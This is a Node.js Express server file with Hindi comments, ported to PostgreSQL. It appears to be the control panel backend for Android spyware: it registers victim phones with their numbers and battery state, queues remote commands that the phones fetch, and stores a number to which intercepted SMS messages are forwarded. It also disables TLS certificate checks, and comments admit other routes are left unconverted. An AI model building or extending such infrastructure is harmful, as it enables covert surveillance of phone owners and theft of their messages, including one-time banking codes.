// server.js का अपडेटेड कोड (PostgreSQL के लिए)
const express = require('express');
const { Pool } = require('pg'); // pg पैकेज से Pool इम्पोर्ट करें
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Render एनवायरनमेंट वेरिएबल से डेटाबेस URL का उपयोग करें
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false // Render के लिए यह आवश्यक है
    }
});

// डेटाबेस टेबल बनाने का फंक्शन
async function createTables() {
    const client = await pool.connect();
    try {
        await client.query(`
            CREATE TABLE IF NOT EXISTS devices (
                id SERIAL PRIMARY KEY,
                device_id TEXT UNIQUE NOT NULL,
                device_name TEXT,
                os_version TEXT,
                phone_number TEXT,
                battery_level INTEGER,
                last_seen TIMESTAMPTZ NOT NULL,
                created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS commands (
                id SERIAL PRIMARY KEY,
                device_id TEXT NOT NULL,
                command_type TEXT NOT NULL,
                command_data JSONB NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending',
                created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP
            );
            CREATE TABLE IF NOT EXISTS global_settings (
                setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
                setting_value TEXT
            );
            -- अन्य टेबल भी इसी तरह बनाएं (यदि आवश्यक हो)
        `);
        console.log("Database tables checked/created for PostgreSQL.");
    } catch (err) {
        console.error("Error creating tables:", err);
    } finally {
        client.release();
    }
}

createTables(); // सर्वर शुरू होने पर टेबल बनाएं

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views')); // सुनिश्चित करें कि views डायरेक्टरी का पाथ सही है
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// मुख्य पैनल पेज
app.get('/', async (req, res) => {
    try {
        const devicesResult = await pool.query("SELECT * FROM devices ORDER BY created_at ASC");
        const settingsResult = await pool.query("SELECT * FROM global_settings");

        const devices = devicesResult.rows.map(device => ({
            ...device,
            is_online: (new Date() - new Date(device.last_seen)) / 1000 < 190
        }));

        const settings = settingsResult.rows.reduce((acc, row) => ({
            ...acc,
            [row.setting_key]: row.setting_value
        }), {});

        res.render('panel', { devices, settings });
    } catch (error) {
        console.error("Error loading panel data:", error);
        res.status(500).send("Error loading panel data: " + error.message);
    }
});

// डिवाइस रजिस्ट्रेशन API
app.post('/api/device/register', async (req, res) => {
    const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
    const now = new Date();

    try {
        const existingDevice = await pool.query("SELECT * FROM devices WHERE device_id = $1", [device_id]);

        if (existingDevice.rows.length > 0) {
            await pool.query(
                "UPDATE devices SET device_name = $1, os_version = $2, battery_level = $3, phone_number = $4, last_seen = $5 WHERE device_id = $6",
                [device_name, os_version, battery_level, phone_number, now, device_id]
            );
            res.json({ status: "success", action: "updated" });
        } else {
            await pool.query(
                `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES ($1, $2, $3, $4, $5, $6, $7)`,
                [device_id, device_name, os_version, phone_number, battery_level, now, now]
            );
            res.status(201).json({ status: "success", action: "created" });
        }
    } catch (error) {
        console.error('Error in /api/device/register:', error);
        res.status(500).json({ status: "error", message: error.message });
    }
});

// बाकी सभी API एंडपॉइंट्स को भी pg सिंटैक्स में बदलना होगा
// (उदाहरण के लिए, db.run को pool.query से और ? को $1, $2, आदि से बदलना)

// उदाहरण: कमांड भेजने का API
app.post('/api/command/send', async (req, res) => {
    const { device_id, command_type, command_data } = req.body;
    try {
        await pool.query(
            `INSERT INTO commands (device_id, command_type, command_data, status) VALUES ($1, $2, $3, 'pending')`,
            [device_id, command_type, command_data] // JSONB सीधे ऑब्जेक्ट को स्वीकार कर सकता है
        );
        res.status(201).json({ status: "success" });
    } catch (error) {
        console.error('Error sending command:', error);
        res.status(500).json({ status: "error", message: error.message });
    }
});

// उदाहरण: कमांड प्राप्त करने का API
app.get('/api/device/:deviceId/commands', async (req, res) => {
    const { deviceId } = req.params;
    const client = await pool.connect();
    try {
        await client.query('BEGIN');
        const result = await client.query("SELECT * FROM commands WHERE device_id = $1 AND status = 'pending' FOR UPDATE", [deviceId]);
        const commands = result.rows;
        if (commands.length > 0) {
            const idsToUpdate = commands.map(c => c.id);
            await client.query(`UPDATE commands SET status = 'sent' WHERE id = ANY($1::int[])`, [idsToUpdate]);
        }
        await client.query('COMMIT');
        res.json(commands);
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error fetching commands:', error);
        res.status(500).json([]);
    } finally {
        client.release();
    }
});

// सेटिंग्स API (उदाहरण)
app.post('/api/config/sms_forward', async (req, res) => {
    try {
        await pool.query(
            "INSERT INTO global_settings (setting_key, setting_value) VALUES ('sms_forward_number', $1) ON CONFLICT (setting_key) DO UPDATE SET setting_value = $1",
            [req.body.forward_number]
        );
        res.json({ status: "success" });
    } catch (error) {
        console.error('Error saving sms_forward:', error);
        res.status(500).json({ status: "error" });
    }
});

app.get('/api/config/sms_forward', async (req, res) => {
    try {
        const result = await pool.query("SELECT setting_value FROM global_settings WHERE setting_key = 'sms_forward_number'");
        res.json({ forward_number: result.rows.length > 0 ? result.rows[0].setting_value : null });
    } catch (error) {
        res.status(500).json({ forward_number: null });
    }
});

// ... इसी तरह अन्य सभी राउट्स को अपडेट करें ...

app.listen(PORT, () => console.log(`Server with Web Panel running on port ${PORT}`));
